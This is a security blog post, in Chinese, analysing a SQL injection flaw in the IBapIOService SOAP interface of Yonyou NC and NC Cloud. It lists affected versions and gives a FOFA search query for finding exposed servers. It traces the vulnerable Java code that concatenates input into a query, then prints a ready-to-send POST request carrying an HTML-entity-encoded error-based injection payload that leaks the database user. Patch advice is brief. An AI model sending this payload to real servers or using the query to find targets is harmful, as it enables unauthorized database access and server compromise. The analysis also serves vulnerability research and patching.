---
title: "用友NC及NC Cloud系统 IBapIOService SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html
asset_dir: assets/用友nc及nc-cloud系统-ibapioservice-sql注入漏洞
---

# 用友NC及NC Cloud系统 IBapIOService SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/17 08:22
* 1273浏览
* [0评论](#comment)
* 46分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

用友 NC [Cloud](#) 是一种商业级的[企业资源规划](#)云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC Cloud nc.itf.bap.service.IBapIOService 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

云存储

# 影响版本

NC65、NCC1903、NCC1909、NCC2005、NCC2105、NCC2111

# fofa语法

> `body="html/downloadBroswer.html" && body="platform/pub/welcome.do"`

# 漏洞分析

看下 nc.itf.bap.service.IBapIOService 的业务逻辑实现

```
public BapTableEntity[] getBapTable(String... tableIds) throws Exception {
        PerfWatch pw = new PerfWatch(NCLangRes4VoTransl.getNCLangRes().getStrByID("8001006_0", "08001006-0271") + StringTools.arr2Str(tableIds, ","));

        BapTableEntity[] tableList;
        try {
            if (!ArrayUtils.isEmpty(tableIds)) {
                List<BapTableEntity> tableList = new ArrayList();

                for(String tableId : tableIds) {
                    MetaTableDef tableDef = null;

                    try {
                        tableDef = this.getMetaDef(tableId);
                    } catch (Exception e) {
                        pw.appendMessage(e.getMessage());
                        throw e;
                    }

                    if (tableDef != null) {
                        tableList.add(BapTableEntity.valueof(tableDef));
                    }
                }
```

`tableIds` 带入 `getMetaDef` 函数，其实现逻辑如下

SQL注入防护

```
private MetaTableDef getMetaDef(String tableId) throws SmartMetaException {
        String[] splits = tableId.split("@");
        if (!ArrayUtils.isEmpty(splits) && splits.length >= 2) {
            MetaTableDef tableDef = SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName(splits[1], splits[0]);
            if (tableDef == null) {
```

对传入的 `tableIds` 按照 `@` 分割成数组，再将分割后的数组0 和 数组1 带入 `SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName` 函数，其实现逻辑如下

```
public MetaTableDef getMetaTableByTableName(String dsName, String tableName) throws SmartMetaException {
        if (StringUtils.isEmpty(tableName)) {
            return null;
        } else {
            String clause = " upper(tableid)='" + tableName.toUpperCase() + "' ";
            if (StringUtils.isEmpty(dsName)) {
                clause = clause + "and isnull(dsname,'~')='~' ";
            } else {
                clause = clause + "and upper(dsname)='" + dsName.toUpperCase() + "'";
            }

            Object[] datas = (new DAOAction()).loadByClause(MetaTable.class, SmartConfigCache.getDsName4Design(), clause);
```

数组1 代表 dsName，数组0 代表 tableName，分别将两个数组部分拼接在SQL语句中，造成SQL注入漏洞。

代码安全审计

根据报错也可以看到拼接结果

[![用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](images/img-001-d0369b1885ff.webp)](https://image.mrxn.net/c97f3430303a4e3caa30df44c9f1e332.webp)

```
sql:SELECT guid,dsname,tableid,displayname,displayname2,displayname3,displayname4,displayname5,displayname6,moduleid,authtype,help,creationtime,modifiedtime,creator,modifier,pk_org,pk_group,dirguid,dr,ts,assetLayer,assetIndustry FROM bi_md_table WHERE  upper(tableid)='DWQUEUE' and upper(dsname)='MESSAGEQUEUE'OR 1 IN (SELECT HOST_NAME())' Unclosed quotation mark after the character string ''.
```

# 漏洞复现

直接访问 wsdl 获取原始 wsdl 内容

漏洞扫描服务

```
GET /uapws/service/nc.itf.bap.service.IBapIOService?wsdl HTTP/1.1
Host: ncc.mrxn.net
```

直接使用 [Burp Suite](https://mrxn.net/tag/burpsuite) 自带的API 扫描 扫描此soap api接口即可得到HTTP请求报文。

[![用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](images/img-002-5b728a0f57d4.webp)](https://image.mrxn.net/be646aab59614d8c81d6d6e73c74ab62.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)验证

```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: ncc.mrxn.net
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
    <soapenv:Header>
    <soapenv:Body>
        <gs:getBapTable>
            <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;</gs:stringarrayItem>
        </gs:getBapTable>
    </soapenv:Body>
</soapenv:Envelope>
```

通过报错注入，成功在响应回显数据库用户信息

企业资源规划

[![用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](images/img-003-c51adc63d4f1.webp)](https://image.mrxn.net/de60bfd2757d409d9b21bcd1ebbfa85c.webp)

针对 mssql 数据库可使用延时或堆叠注入进行验证。

# 解决方案

打对应补丁，重启服务

编程

# 参考

* <https://security.yonyou.com/#/noticeInfo?id=401>

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.解决方案](#toc-6-)
* [7.参考](#toc-7-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANrklEQVR4Aeyc4XLjSA6D8937v/Nc0Agskm7Z3mR34h/aGgxIEKR6RClxclX3v4+Pjz//FH++/tv1fZX+0cz0hHdzH2nqe1RXTR5B8Q6qPcOuT9quT/p3oIV8fA58CZ8XOP2TGTEkD0cPRxcDH0BKt7NEkGeH1OF5b7yZkzwMrDMAkW45sOJnvbfGEqTnGadlLSTJxb9/B9pCwE8CdP4nxwT3pgec5wmJHgYS3vHsAdaTOo3yRYO9B6yDOX71Csl3rLoA7lVcseuZGrgXOk9fW8gsXvnfvwM/WsijpwT8JMTzyj8N3APm9IDzzIL7PLXwWe+j+llP9PSCrw/mqsf7Xf7RQr570avv/A78eCHgpwTMeVrmJcH16OBc/miKK+DwSI8vDK4rB8dglrYD9LrmCsDO3jRg+z0sJs1J/F3+8UK+e+Grb38H2kK04R32rR/bpwWeP0W6xkf5T7lQpBVKE2A/U7WJ1Vj+Sr1IK4wOnq18FT7/UiyAa5/S+iOtYokv/lX7ajzb20Jm8dv51fjtO7AWAn4S4DHvrpJtpzbz6I8YfN14oOfRzxi4K+UcwPZNvmt4QYDHs4C7KcC6PjzmNK6FJLn49+/A//Ik/RN+dGzwk5B50wu9DtwswHqaZm9ycP3W8BWo/hXeCOxVTQDnN8MLgfoE6L3gXDUBnNeR0r+D6w2pd/EN4rYQ8Kahc84J1pNXnk9DrSlOXXFFdHHVFYOvB2Z5BNUEsA4HS68A19Qn1JpiaQJw91tm6L3yCeoTwHXFAViDzqmHodfB+VoIOIn5jHUYodah94Jz6Fx7zmLNFsC9ioX4oeuqCaqLBcWC4gppO8AxM3U4NM2YevKwPM8Anjl7kofXQp